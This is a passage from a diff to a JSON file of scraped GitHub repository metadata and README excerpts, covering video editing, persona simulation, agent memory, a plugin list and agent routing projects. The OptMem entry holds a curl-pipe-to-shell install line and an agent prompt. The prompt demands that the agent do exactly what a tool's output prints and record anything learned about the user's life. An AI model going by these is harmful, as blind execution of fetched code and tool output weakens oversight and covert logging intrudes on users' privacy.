alt=\"Demo\"></a>\n  <a href=\"LICENSE\"><img src=\"https://img.shields.io/badge/License-Apache_2.0-blue.svg\" alt=\"License\"></a>\n</p>\n\n<p align=\"center\">\n  <img src=\"assets/teaser.jpg\" width=\"96%\" alt=\"JoyAI-Video-Edit teaser\">\n</p>\n\nJoyAI-Video-Edit is a real-time, instruction-guided video editing system for open-ended video streams. Given a live camera stream or uploaded video and a natural-language edit instruction, it edits frames causally as they arrive, without waiting for the full video, requiring a predefined video length, or revisiting future frames. In our deployment benchmark, the full end-to-end pipeline reaches 30 FPS at 720 × 1248, pushing video editing from offline batch processing toward interactive streaming generation.\n\nThe system combines an MLLM-based condition encoder, a causal video VAE, and a 16B-parameter multimodal diffusion transformer. It is trained and deployed as an autoregressive diffusion editor, then accelerated with aligned autoregressive distribution matching distillation, long-horizon optimization, bounded KV-state inference, and deployment-oriented scheduling to sustain high-throughput 720p editing while reducing train-inference mismatch and accumulated temporal drift.\n\n## 🔥🔥🔥 News!!\n\n- 2026.08.15: 🎉 Live demo released — real-time streaming video editing on a single RTX PRO 6000 (Blackwell) GPU: 840 × 480 @ 24 FPS or 720p @ 16 FPS. **[Try HuggingFace Demo](https://huggingface.co/spaces/wxDai/joyai-video-edit)**\n- 2026.08.14: 🎉 Released an upgraded checkpoint with significantly stronger reference-image-guided video editing (RV2V), delivering better subject and identity preservation, more faithful reference conditioning, and improved temporal consistency across long streams. Grab the new **[DiT weights](https://huggingface.co/jdopensource/JoyAI-Video-Edit/blob/main/dit/joyai_video_edit_dit_0811.pth)**.\n- 2026.08.05: 🎉 We release the deployment code, [technical report](https://arxiv.org/pdf/2608.03974), and JoyAI-Video-Edit checkpoints. Please check the links above for details.\n\n## 💎 Highlights\n\n- **Real-time open-ended editing.** Edits live or uploaded videos as frames arrive, without requiring the full sequence upfront.\n- **Diverse instruction control.** Supports subject edits, local edits, background changes, style transfer, motion changes, and reference-guided editing.\n- **Autoregressive diffusion design.** Combines an MLLM condition encoder, causal video VAE, and MMDiT backbone for streaming video editing.\n- **High-throughput 720p deployment.** Reaches 30 FPS end-to-end throughput at 720 × 1248 with bounded KV-state inference and stable per-chunk compute.\n\n## 🚧 TODO\n\n- [x] **Stronger model version in progress.** A more powerful version is under active development, with a particular focus on advancing reference-image-guided video editing (RV2V) capabilities.\n- [ ] **Consumer GPU support.** Optimize deployment for consumer-grade GPUs such as GeForce RTX 5090.\n- [ ] **Diffusers support.** Provide a 🤗 Diffusers pipeline for JoyAI-Video-Edit to streamline loading and inference.\n- [ ] **LongV2VBench release.** Release LongV2VBench for long-form video-to-video editing evaluation.\n- [ ] **Release full training and data pipelines.** Open-source the complete training framework and data generation pipeline.\n\n## 🎬 Showcase\n\nJoyAI-Video-Edit is designed for broad video editing tasks, including global appearance changes, local object edits, subject add/remove/replace, background replacement, style transfer, and reference-guided edits.\n\nhttps://github.com/user-attachments/assets/bca232c9-75df-46f9-b366-14cfa2651994\n\n<table>\n  <tr>\n    <th>Source</th>\n    <th>Prompt</th>\n    <th>Edited</th>\n  </tr>\n  <tr>\n    <td><a href=\"https://github.com/user-attachments/assets/dc7c3cf6-de0b-4b7b-9afe-d4e38c4ea6e1\"><img src=\"assets/cases/case01_source.gif\" width=\"220\" alt=\"Case 01 source\"></a></td>\n    <td>Transform the people, hairstyles, and interior into a British castle aristocratic style.</td>\n    <td><a href=\"https://github.com/user-attachments/assets/dbb9b6de-9d63-4879-8418-96610eac79b3\"><img src=\"assets/cases/case01_edited.gif\" width=\"220\" alt=\"Case 01 edited\"></a></td>\n  </tr>\n  <tr>\n    <td><a href=\"https://github.com/user-attachments/assets/79792d23-7037-43c2-b185-dfd529aac3b7\"><img src=\"assets/cases/case",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:25.748166"
+  },
+  {
+    "basic_info": {
+      "name": "MatrAIx-Persona-8B",
+      "full_name": "MatrAIx-ai/MatrAIx-Persona-8B",
+      "owner": "MatrAIx-ai",
+      "description": "Simulate Before Reality. ",
+      "url": "https://github.com/MatrAIx-ai/MatrAIx-Persona-8B",
+      "clone_url": "https://github.com/MatrAIx-ai/MatrAIx-Persona-8B.git",
+      "ssh_url": "git@github.com:MatrAIx-ai/MatrAIx-Persona-8B.git",
+      "homepage": "https://matraix.ai/",
+      "created_at": "2026-07-31T06:40:09Z",
+      "updated_at": "2026-08-23T02:08:30Z",
+      "pushed_at": "2026-08-22T20:44:33Z"
+    },
+    "stats": {
+      "stars": 1484,
+      "forks": 223,
+      "watchers": 1484,
+      "open_issues": 4,
+      "size": 20746
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 8907500,
+        "TypeScript": 1835261,
+        "Jupyter Notebook": 738288,
+        "HTML": 490205,
+        "Shell": 302887,
+        "CSS": 30274,
+        "JavaScript": 13417,
+        "PowerShell": 8042,
+        "Dockerfile": 7396,
+        "Jinja": 5862,
+        "Go Template": 4181
+      },
+      "license": "MIT License",
+      "topics": []
+    },
+    "content": {
+      "readme": "<div align=\"center\">\n  <h1>MatrAIx</h1>\n  <p><strong>Simulate before reality.</strong></p>\n  <p>\n    Population-scale, persona-driven infrastructure for evaluating AI systems\n    and interactive products with heterogeneous simulated users.\n  </p>\n  <p>\n    <strong>English</strong> |\n    <a href=\"docs/i18n/README.zh-CN.md\">简体中文</a> |\n    <a href=\"docs/i18n/README.zh-TW.md\">繁體中文</a> |\n    <a href=\"docs/i18n/README.ko.md\">한국어</a> |\n    <a href=\"docs/i18n/README.ja.md\">日本語</a> |\n    <a href=\"docs/i18n/README.es.md\">Español</a> |\n    <a href=\"docs/i18n/README.pt-BR.md\">Português</a>\n  </p>\n  <p>\n    <a href=\"https://matraix.ai/\"><img alt=\"Website\" src=\"https://img.shields.io/badge/Website-matraix.ai-4f7cff?style=for-the-badge\"></a>\n    <a href=\"https://discord.gg/knVyQQnRFa\"><img alt=\"Discord\" src=\"https://img.shields.io/badge/Discord-join%20MatrAIx-5865F2?style=for-the-badge&logo=discord&logoColor=white\"></a>\n    <a href=\"https://x.com/MatrAIx2026\"><img alt=\"X\" src=\"https://img.shields.io/badge/X-%40MatrAIx2026-000000?style=for-the-badge&logo=x&logoColor=white\"></a>\n    <a href=\"https://www.linkedin.com/company/matraix\"><img alt=\"LinkedIn\" src=\"https://img.shields.io/badge/LinkedIn-MatrAIx-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white\"></a>\n    <a href=\"https://forms.gle/hwEHng5HGWRqcJue9\"><img alt=\"Google Form\" src=\"https://img.shields.io/badge/Google%20Form-join%20MatrAIx-4285F4?style=for-the-badge&logo=googleforms&logoColor=white\"></a>\n    <a href=\"docs/README.md\"><img alt=\"Docs\" src=\"https://img.shields.io/badge/Docs-Handbook-5b5b5b?style=for-the-badge\"></a>\n    <a href=\"https://huggingface.co/datasets/MatrAIx2026/MatrAIx_Persona_1M_Public_Release\"><img alt=\"Hugging Face\" src=\"https://img.shields.io/badge/Hugging%20Face-Persona%201M-ffcc4d?style=for-the-badge\"></a>\n    <a href=\"LICENSE\"><img alt=\"License\" src=\"https://img.shields.io/badge/License-MIT-c33b32?style=for-the-badge\"></a>\n    <a href=\"docs/quickstart.md#10-playground--play-tasks-visually\"><img alt=\"Playground\" src=\"https://img.shields.io/badge/Playground-Visual%20Runner-56b879?style=for-the-badge\"></a>\n  </p>\n</div>\n\n<div align=\"center\">\n  <a href=\"https://www.youtube.com/watch?v=cNFkz9Wo1y4&t=15s\">\n    <img src=\"https://img.youtube.com/vi/cNFkz9Wo1y4/maxresdefault.jpg\" alt=\"Watch the MatrAIx demo on YouTube\" width=\"900\">\n  </a>\n  <p>\n    <a href=\"https://www.youtube.com/watch?v=cNFkz9Wo1y4&t=15s\"><img alt=\"Watch the MatrAIx demo on YouTube\" src=\"https://img.shields.io/badge/%E2%96%B6%20Watch%20the%20demo-on%20YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white\"></a>\n  </p>\n</div>\n\n---\n\n**MatrAIx** is a population-scale, persona-driven infrastructure for evaluating\nAI systems and interactive products with heterogeneous simulated users. Instead\nof testing against a generic or interchangeable user, MatrAIx instantiates\nsampled persona records as LLM agents and runs them through reproducible tasks\nacross four environments — **Survey**, **AI Chatbot**, **Web**, and **App**\n(native desktop and mobile, including macOS and iOS).\n\nAt its foundation is a shared schema of **1,290 categorical dimensions** covering\nbackground, psychology, capability, and behavior. Personas combine\ndependency-aware synthetic generation with evidence-aware human grounding; a\ndeterministic, quality-filtered coreset of **one million personas** is released\nfor research on\n[Hugging Face](https://huggingface.co/datasets/MatrAIx2026/MatrAIx_Persona_1M_Public_Release).\nShared telemetry, task-owned verification, and reporting connect individual\nresponses and trajectories to subgroup- and population-level findings.\n\nThe name nods to *The Matrix*: a simulated world useful for exploration, stress\ntesting, and hypothesis generation, **not a replacement for evidence from real\npeople**.\n\n## News & Recognition\n\n- **Academic commentary** — [*Can We Simulate the World?*](https://aiscientist.substack.com/p/can-we-simulate-the-world) — Mayank Kejriwal, [*AI Scientist*](https://aiscientist.substack.com/)\n- **Research selection** — Featured on [Hugging Face Papers](https://huggingface.co/papers/2608.04205) ([Daily Papers, 2026-08-10](https://huggingface.co/papers/date/2026-08-10))\n- **Media** — [NZZ am Sonntag](https://www.nzz.ch/nzz-am-sonntag/report-und-debatte/die-ki-vermessung-der-menschheit-unsere-acht-milliarden-doppelgaenger-ld.10019342) · [AI Era (via 36Kr)](https://www.36kr.com/p/3932853833759876) · [Numerama](https://www.numerama.com/tech/2308727-ces-chercheurs-ont-cree-83-milliards-dhumains-virtuels-pour-tester-des-produits-a-notre-place.html) · [Infobae](https://www.infobae.com/tecno/2026/08/10/asi-prueba-la-ia-un-mundo-con-8300-millones-de-personas-digitales-matraix-es-el-metaverso/) · [AI타임스](https://www.aitimes.com/news/articleView.html?idxno=213824) · [Startup Fortune](https://startupfortune.com/harvard-and-mit-built-an-ai-model-of-83-billion-people-to-test-products-on/) · [Forbes Türkiye](https://www.forbes.com.tr/saglik/hastaya-dokunmadan-once-8-3-milyar-ke",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:27.069440"
+  },
+  {
+    "basic_info": {
+      "name": "OptMem",
+      "full_name": "VictorTaelin/OptMem",
+      "owner": "VictorTaelin",
+      "description": "Permanent memory for AI agents. A 426-token prompt, a script, plug and play.",
+      "url": "https://github.com/VictorTaelin/OptMem",
+      "clone_url": "https://github.com/VictorTaelin/OptMem.git",
+      "ssh_url": "git@github.com:VictorTaelin/OptMem.git",
+      "homepage": null,
+      "created_at": "2026-07-25T16:58:43Z",
+      "updated_at": "2026-08-22T20:57:19Z",
+      "pushed_at": "2026-07-31T02:19:57Z"
+    },
+    "stats": {
+      "stars": 1449,
+      "forks": 94,
+      "watchers": 1449,
+      "open_issues": 9,
+      "size": 11229
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 58958,
+        "JavaScript": 31396,
+        "HTML": 2906,
+        "Shell": 624
+      },
+      "license": null,
+      "topics": []
+    },
+    "content": {
+      "readme": "# OptMem\n\nPermanent memory for AI agents. A 426-token prompt, a script, plug and play.\n\n![how OptMem works](anim/optmem.gif)\n\n## Install\n\n```sh\ncurl -fsSL https://raw.githubusercontent.com/VictorTaelin/OptMem/main/install.sh | sh\n```\n\nIt prints a `## Memory` block. Paste that at the top of your agent's\n`AGENTS.md` (or `CLAUDE.md`), and you are done. Run the same line again to\nupdate.\n\nThe tool lands at `~/.optmem/memo`; put `~/.optmem` on `PATH` to type `memo`.\n\n## Commands\n\n| | |\n|---|---|\n| `memo wake` | read the memory — the first command of every session |\n| `memo note \"...\"` | record one memory: one line, up to 280 bytes |\n| `memo nap` | answer the merges that came due |\n| `memo recall <regex>` | search every memory ever recorded, word for word |\n| `memo zoom <lo>-<hi>` | open a tree node into its two halves |\n| `memo forget <lo>-<hi>` | drop a bad summary; the next nap rebuilds it |\n\nMerges arrive one at a time, in the output of `note`. Nothing ever runs in the\nbackground.\n\n## Files\n\n```\n~/.optmem/\n  memo          the tool: one file of Python 3, no dependencies\n  memory/\n    LOG.txt     every memory, one per line, append-only, never edited\n    TREE/       the summaries: a cache, rebuildable from the log alone\n    config      the sizes, written by `memo config`\n```\n\n```sh\nmemo config                  # show the sizes\nmemo config WAKE_LINES=300   # how many lines wake prints (96 ≈ 8k tokens)\nmemo config WAKE_LINES=      # back to the default\n```\n\n`WAKE_LINES` is the only size worth touching, and it is a reading budget, not\na storage budget: change it whenever, in either direction, and nothing is\nrecomputed.\n\nRecords are fixed width, so position *is* identity and every lookup is one\nseek. At a million memories (608 MB), `wake` takes 0.03s.\n\nSet `$MEMORY_DIR` to keep `memory/` elsewhere — a synced folder, a git repo.\n\n## The prompt\n\nThis is what the installer prints, and the whole of the integration.\n\n```markdown\n## Memory\n\nYour memory is OptMem:\n- The tool is `~/.optmem/memo`\n- Your memories are in `~/.optmem/memory`\n\nOptMem outlives every session, compaction, model and vendor change.\nWithout it you do not know who you are, or what was decided and tried.\n\n### At startup: activating OptMem (mandatory)\n\nRun `~/.optmem/memo wake` before any other tool call, in every session, and\nthen do exactly what it prints, to the end of its output.\n\n### While working: register memories (mandatory)\n\nCall `~/.optmem/memo note \"<1 line, max 280 bytes>\"` whenever you learn\nsomething new, or something worth keeping happens. That covers a task\nworth real effort, a fact or insight the user teaches you, anything you\nlearn about their life (even indirectly), any event of lasting effect.\n\nDo not register redundant memories.\n\nIf `~/.optmem/memo note` asks a compression: do it before your next action.\n\nNever edit or delete anything under `~/.optmem/memory`: the tool manages it.\n\n### When you need an old memory: search, or navigate\n\n`~/.optmem/memo recall <regex>` searches every memory, word for word.\n\nYour memories also form a binary tree: #0-1, #2-3 ... exist as one-line\nsummaries, pairs of those as #0-3, and so on -- every `#a-b` line wake\nprints is one node of it. `~/.optmem/memo zoom <a-b>` opens a node into its\ntwo halves, down to the raw memories.\n\n### If you're a subagent: skip everything above\n\nParallel sessions on this machine are all you, and may all write memories.\nA subagent is not: it must never run `memo`, because it cannot judge what\nis already known, and its notes would arrive duplicated and incorrectly.\nWhen you spawn one, write: `You are a subagent. Don't run memo.`\n```\n",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:28.409656"
+  },
+  {
+    "basic_info": {
+      "name": "awesome-dsh-plugins",
+      "full_name": "AdamPlatin123/awesome-dsh-plugins",
+      "owner": "AdamPlatin123",
+      "description": "DSH 插件雷达与精选榜：多路自动发现 9000+ 候选，容器真实安装路径运行级实测（四档判定），精选 Top 50 · 11 类人工策展，全量索引 PLUGINS-ALL.md，自动更新。",
+      "url": "https://github.com/AdamPlatin123/awesome-dsh-plugins",
+      "clone_url": "https://github.com/AdamPlatin123/awesome-dsh-plugins.git",
+      "ssh_url": "git@github.com:AdamPlatin123/awesome-dsh-plugins.git",
+      "homepage": "",
+      "created_at": "2026-08-04T21:46:54Z",
+      "updated_at": "2026-08-23T02:12:55Z",
+      "pushed_at": "2026-08-23T02:02:43Z"
+    },
+    "stats": {
+      "stars": 1339,
+      "forks": 130,
+      "watchers": 1339,
+      "open_issues": 9,
+      "size": 8311
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 88692
+      },
+      "license": "MIT License",
+      "topics": [
+        "agent-plugins",
+        "awesome-list",
+        "deepseek-harness",
+        "dsh",
+        "dsh-plugin",
+        "plugin-registry"
+      ]
+    },
+    "content": {
+      "readme": "# Awesome DSH Plugins\n\n<p align=\"center\">\n  <img src=\"assets/banner-entertainment.jpg\" width=\"440\" alt=\"Awesome DSH Plugins banner\"><br>\n  <img src=\"assets/stickers/21-tests-passed.png\" width=\"126\" alt=\"测试通过\">\n \n\n</p>\n\n<p align=\"center\">\n  <a href=\"https://trendshift.io/repositories/147500\" title=\"GitHub Trending 日榜 #22 · 2026-08-14 · 全语言口径\"><img src=\"https://trendshift.io/api/badge/trendshift/repositories/147500/daily\" alt=\"Trendshift\"></a>\n</p>\n\n\n**自动发现、证据验证的 DeepSeek Harness 插件生态雷达。自动发现 9200+ 候选、逐个 k8s 实测**\n\n\n安装前就知道哪个能用，不用自己踩坑。\n\n[![confirmed](https://img.shields.io/badge/confirmed-5075-blue)](#精选插件榜) [![scan](https://img.shields.io/badge/scan-every_6h-green)](#当前生态快照) [![tested](https://img.shields.io/badge/tested-1673-orange)](#本仓库如何判定) [![dshfind](https://dshfind.com/api/badge/AdamPlatin123/awesome-dsh-plugins?lang=zh)](https://dshfind.com/zh/plugins/AdamPlatin123/awesome-dsh-plugins?ref=badge) [![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)\n\n[![运行级可用](https://img.shields.io/badge/运行级可用-979-brightgreen)](#2-看懂状态统一四档口径) [![运行级不兼容](https://img.shields.io/badge/运行级不兼容-600-red)](#2-看懂状态统一四档口径) [![待定](https://img.shields.io/badge/待定-94-yellow)](#2-看懂状态统一四档口径) [![未测](https://img.shields.io/badge/·_未测-0-lightgrey)](#2-看懂状态统一四档口径)\n\n\n\n简体中文 | [English](README.en-US.md)\n\n---\n\n> 收录 5075 个 DSH 插件仓库（索引到9247个repos，正由专用K8s集群，动态在DSH最新版本下验证可用性，目前高速迭代中）。\n\n## 工作原理\n\n> 数据截至快照 `20260818T190001Z`（2026-08-19 03:00:01 UTC+8 · 分类器 unified-v2-bridge）\n\n<!-- AUTO:pipeline:START -->\n```mermaid\nflowchart TB\n    subgraph Discovery[\"发现（每 6 小时 · probe 每 15 分钟 巡检触发）\"]\n        A1[\"GitHub Search<br/>topic ×2 + keyword ×3<br/>候选 9247 · 龄 58m\"]\n        A2[\"本地库补全 · 去重 repo id\"]\n        A3[\"私有 org 仓排除<br/>35s 错峰 · 403 退避 · dshow 黑名单\"]\n    end\n    subgraph Validation[\"验证（driver 20s 流式循环）\"]\n        B1{\"package.json<br/>name + main/exports/dsh?\"}\n    end\n    B1 -->|\"插件 5075\"| C1[\"k8s 运行级测试<br/>一插件一 pod · 并发 10<br/>dsh agent + Qwen（de-stream）\"]\n    B1 -->|\"非插件（累计删 1064）\"| B3[\"即删省空间\"]\n    C1 --> D1{\"判定 · 总 1673\"}\n    D1 -->|\"979 / 600\"| E1[\"聚合 + README 分类统计\"]\n    D1 -->|\"94 环境类重试\"| C1\n    E1 --> E2[\"cadence 交付<br/>本周期增量 —/100<br/>双仓 bot PR（幂等 supersede）\"]\n    M[\"radar-probe 每 15 分钟 自愈<br/>7 指标流 × 60s · 完成累计 0\"]\n    M -.-> A1\n    M -.-> C1\n```\n<!-- AUTO:pipeline:END -->\n\n**🔌 开源计划 — 本页数据由「DSH 插件雷达」服务管线自动生产，服务雷达源码正在优化中，稳定后将分阶段开源：**\n\n| 阶段 | 开源内容 | 状态 |\n|---|---|---|\n| Phase 1 | 管线文档：[总览与路线图](docs/radar/overview.md) · [架构](docs/radar/architecture.md) · [数据契约](docs/radar/data-contracts.md) | ✅ 已开源 |\n| Phase 2 | 雷达引擎源码（发现 · 聚合 · 渲染 · 分发） | 🔜 稳定后开源 |\n| Phase 3 | 测试引擎源码：轻量版（无需 k8s · 本地直跑）· 服务器版（k8s 集群） | 🔜 稳定后开源 |\n\n## 快速导航\n\n| 你的目标 | 跳转入口 |\n|---|---|\n| 看精选插件 | [精选插件榜](#精选插件榜) — rc.8 实测可用 · 类序星标降序 |\n| 按用途找一个插件 | [分类目录](#分类目录) — 13 类功能领域 · 逐插件明细见 [PLUGINS-ALL.md](PLUGINS-ALL.md)；[PLUGINS.md](PLUGINS.md) 为 PR 登记清单 |\n| 浏览自动发现的全部仓库 | [ 当前生态快照](#当前生态快照) — 日期化兼容矩阵 |\n| 了解最近发生了什么 | [ CHANGELOG](CHANGELOG.md) |\n| 登记或提交插件 | [ 给插件开发者](#给插件开发者) · 加 `dsh-plugin` topic → 8h 自动收录 · [PR 模板](.github/PULL_REQUEST_TEMPLATE.md) |\n| 了解本雷达与开源计划 | [ 雷达总览与路线图](docs/radar/overview.md) · 架构与数据契约见 [docs/radar/](docs/radar/) |\n| 给插件使用者指南 | [ 给插件使用者](#给插件使用者) |\n| 本仓库如何判定兼容性 | [ 本仓库如何判定](#本仓库如何判定) |\n| 加入社群交流 | [ DSH 学习社区](#dsh-学习社区-dshfindcom) · [社区讨论群](#社区讨论群) |\n\n> [!IMPORTANT]\n> **收录不等于兼容，静态检查不等于运行可用，运行可用也不等于安全审计。**\n> 本仓库提供可追溯的筛选信号，不代表 DSH 官方背书。安装第三方插件前，请检查插件源码、权限、依赖、许可证及测试日期。\n\n## 精选插件榜\n\n<!-- AUTO:featured:START -->\n\n> 人工策展 50 款 rc.8 实测可用插件（v4flash 全量重测通过者，2026-08-21），类序与类内均按星标降序；星标每 6 小时自动刷新（成员调整请提 PR 修改 data/awesome-50.json）。数据截至 2026-08-23 10:02（UTC+8）。\n\n### 🚀 智力增强 Booster（6）\n\n| 插件 | ⭐ | rc.8 实测 | 说明 |\n|---|---:|---|---|\n| [dsh-routing-suite](https://github.com/yjh051108/dsh-routing-suite) | 6643 | — | 注入器 × 思维模式路由套装：免重启运行时注入器 + 任务感知推理模式路由预设（P1-P23 实测） |\n| [harmony-next.skills](https://github.com/linhay/harmony-next.skills) | 335 | ✅ | 技能驱动的工作流增强 |\n| [superpowers-dsh](https://github.com/LayneChai/superpowers-dsh) | 81 | ✅ | TDD/调试/计划等开发技能集 |\n| [forkprobe](https://github.com/Jayden-X-L/forkprobe) | 70 | ✅ | 同一任务跑多个技能对比，自动选优 |\n| [dsh-tool-turbo](https://github.com/Electricitysheep/dsh-tool-turbo) | 7 | ✅ | 按轮次自动优化 reasoning_effort（推理力度） |\n| [dsh-reasoning-settings](https://github.com/JuneLearn/dsh-reasoning-settings) | 6 | ✅ | 推理设置控制：让模型按任务切换思考档位 |\n\n### 🖥 界面与工作台（7）\n\n| 插件 | ⭐ | rc.8 实测 | 说明 |\n|---|---:|---|---|\n| [dsh-web-ui](https://github.com/zhu1090093659/dsh-web-ui) | 5605 | ✅ | Web UI 增强与皮肤合集：任务看板、Git 图、移动端、皮肤中心 |\n| [DSH-better-sidebar](https://github.com/omdsh-dev/DSH-better-sidebar) | 2657 | ✅ | 侧边栏变完整工作台：文件编辑/终端/Git/子代理，支持三方注册扩展页 |\n| [dsh-genui](https://github.com/omdsh-dev/dsh-genui) | 297 | ✅ | GenUI 内联组件：图表/表单/测验/3D 场景 + action 事件环 |\n| [dsh-visualize](https://github.com/Nagi-ovo/dsh-visualize) | 204 | ✅ | 对话中生成交互式可视化卡片 |\n| [Liang-Saint-Slider](https://github.com/BruzWJ/Liang-Saint-Slider) | 92 | ✅ | 模型与思考力度选择滑条 |\n| [dsh-annotation](https://github.com/omdsh-dev/dsh-annotation) | 90 | ✅ | 划选文字→批注→随消息发送，回复逐条对照 |\n| [dsh-navbar](https://github.com/vlln/dsh-nav",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:29.733750"
+  },
+  {
+    "basic_info": {
+      "name": "sprix-sage-router",
+      "full_name": "wang2122/sprix-sage-router",
+      "owner": "wang2122",
+      "description": "Sprix AI at 屿智同行 — state-aware SELF/COLLABORATE/HANDOFF routing for A2A agent networks.",
+      "url": "https://github.com/wang2122/sprix-sage-router",
+      "clone_url": "https://github.com/wang2122/sprix-sage-router.git",
+      "ssh_url": "git@github.com:wang2122/sprix-sage-router.git",
+      "homepage": "",
+      "created_at": "2026-08-18T04:08:11Z",
+      "updated_at": "2026-08-22T16:02:27Z",
+      "pushed_at": "2026-08-21T08:45:27Z"
+    },
+    "stats": {
+      "stars": 1243,
+      "forks": 12,
+      "watchers": 1243,
+      "open_issues": 0,
+      "size": 92
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 56427
+      },
+      "license": "MIT License",
+      "topics": [
+        "a2a",
+        "agent-orchestration",
+        "agent-routing",
+        "ai-agents",
+        "multi-agent-systems",
+        "python",
+        "sprix-ai",
+        "task-scheduling"
+      ]
+    },
+    "content": {
+      "readme": "<div align=\"center\">\n\n# Sprix SAGE Router\n\n### State-aware agent matching for open A2A networks\n\n[![Tests](https://github.com/wang2122/sprix-sage-router/actions/workflows/tests.yml/badge.svg)](https://github.com/wang2122/sprix-sage-router/actions/workflows/tests.yml)\n[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)\n[![License](https://img.shields.io/badge/License-MIT-0F766E.svg)](LICENSE)\n[![Status](https://img.shields.io/badge/Status-Research%20Preview-D97706.svg)](#project-status)\n\n**An open-source research output of [Sprix AI](#about-sprix-ai) at 屿智同行.**\n\nChoose whether an agent should **continue alone**, **recruit complementary collaborators**, or **hand off the task**—then assign task-DAG roles, schedule dependencies, and learn from execution evidence under permission, budget, and deadline constraints.\n\n[Quick start](#quick-start) · [Algorithm](ALGORITHM.md) · [Benchmark](#benchmark) · [Contributing](CONTRIBUTING.md) · [Security](SECURITY.md)\n\n</div>\n\n---\n\n## Why SAGE?\n\nAgent discovery tells a system which agents exist. It does not answer the harder runtime question: **who should work with whom after execution has already begun?**\n\nSAGE—**State-Aware Graph Exchange**—is the decision layer between A2A discovery and task execution. It evaluates three routes in one auditable objective:\n\n| Route | Ownership | Best used when |\n|---|---|---|\n| **SELF** | Incumbent agent | Existing capability and accumulated context are sufficient |\n| **COLLABORATE** | Incumbent retains ownership | A small complementary team covers missing requirements |\n| **HANDOFF** | A peer takes full ownership | Specialist advantage exceeds context-transfer loss |\n\nSAGE is designed to sit above the [Agent2Agent (A2A) protocol](https://a2a-protocol.org/latest/). A2A provides Agent Cards, messages, tasks, artifacts, authentication, and transport. SAGE decides **which feasible agent configuration should execute the task, in which mode, and why**.\n\n![SAGE state-aware routing system](docs/assets/sage-routing-system.svg)\n\n<p align=\"center\"><sub><b>Figure 1.</b> SAGE constrains the candidate space before comparing SELF, COLLABORATE, and HANDOFF, then updates contextual trust from execution evidence.</sub></p>\n\n## What makes SAGE different?\n\n- **Mid-execution tri-mode routing.** SELF, COLLABORATE, and HANDOFF compete in the same utility function instead of relying on disconnected heuristics.\n- **Progress-aware replanning.** Active executors, completed DAG nodes, failures, accumulated progress, and transferable context affect whether switching is worthwhile.\n- **Complementarity before prestige.** A team is rewarded for marginal requirement coverage, not for collecting individually high-ranked but redundant agents.\n- **Contextual trust instead of one reputation score.** Reliability is learned per agent and per requirement, so success in coding does not automatically imply strength in research.\n- **Task-DAG role assignment.** Every remaining requirement is assigned to an executor; dependency edges become an inspectable communication topology and critical-path latency estimate.\n- **Learned outcome model.** A regularized online predictor replaces the original fixed success equation and can later be swapped for a production reward model.\n- **Bounded team search.** Beam search compares multiple team prefixes instead of committing to one greedy sequence.\n- **Bid fidelity.** Quoted confidence, cost, and latency are calibrated against observed execution evidence.\n- **Permission-first matching.** Ineligible agents never enter the ranking, regardless of predicted quality.\n- **Evidence-aware credit.** Per-requirement and per-agent outcomes avoid giving every teammate identical full credit.\n- **Auditable output.** Every decision includes assignments, topology, success, coverage, cost, latency, risk, utility, and a human-readable rationale.\n\n## Core algorithm\n\nFor task requirement \\(r\\), SAGE combines global and requirement-conditioned trust into calibrated capability \\(q_{a,r}\\). Team coverage is:\n\n$$\nC_r(S)=1-\\prod_{a\\in S}(1-q_{a,r})\n$$\n\nEach requirement is assigned to the strongest calibrated team member. SAGE schedules these assignments over the requirement DAG, serializing work assigned to one agent and parallelizing independent work assigned to different agents. Team-level cost and critical-path latency are checked again after construction.\n\nEvery feasible route is ranked by:\n\n$$\nU(m,S,z,E)=V\\hat p_\\theta(y=1\\mid x,m,S,z,E)-\\lambda_c C-\\lambda_l L-\\lambda_r R-\\lambda_h H-\\lambda_o O-\\lambda_u\\mathcal U+\\beta\\mathcal B\n$$\n\nHere \\(z\\) is role assignment, \\(E\\) is the induced communication topology, \\(H\\) is context-transfer loss, \\(O\\) is coordination overhead, and \\(\\mathcal U/\\mathcal B\\) support uncertainty-aware exploration. The full design and limitations are documented in [ALGORITHM.md](ALGORITHM.md).\n\n![Conceptual SAGE tri-mode policy map](docs/assets/tri-mode-policy-map.svg)\n\n<p al",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:31.071408"
+  },
+  {
+    "basic_info": {
+      "name": "book-to-skill",
+      "full_name": "Leutenegger/book-to-skill",
+      "owner": "Leutenegger",
+      "description": "Turn any technical book PDF into a Claude Code skill — ready to study, reference, and use while you work.",
+      "url": "https://github.com/Leutenegger/book-to-skill",
+      "clone_url": "https://github.com/Leutenegger/book-to-skill.git",
+      "ssh_url": "git@github.com:Leutenegger/book-to-skill.git",
+      "homepage": "",
+      "created_at": "2026-08-13T13:15:23Z",
+      "updated_at": "2026-08-22T22:41:42Z",
+      "pushed_at": "2026-08-14T11:41:40Z"
+    },
+    "stats": {
+      "stars": 1229,
+      "forks": 147,
+      "watchers": 1229,
+      "open_issues": 2,
+      "size": 3947
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 211641,
+        "HTML": 1762
+      },
+      "license": "MIT License",
+      "topics": [
+        "agent",
+        "agent-memory",
+        "agent-skill",
+        "agent-skills",
+        "agentic",
+        "agentic-ai",
+        "agents",
+        "ai-agents",
+        "claude",
+        "claude-code",
+        "claude-code-plugin",
+        "claude-skills",
+        "github-copilot",
+        "pdf",
+        "pdf-document",
+        "pdf-generation",
+        "pdf-parser",
+        "pdf-tools",
+        "pdf-viewer",
+        "skill-generator"
+      ]
+    },
+    "content": {
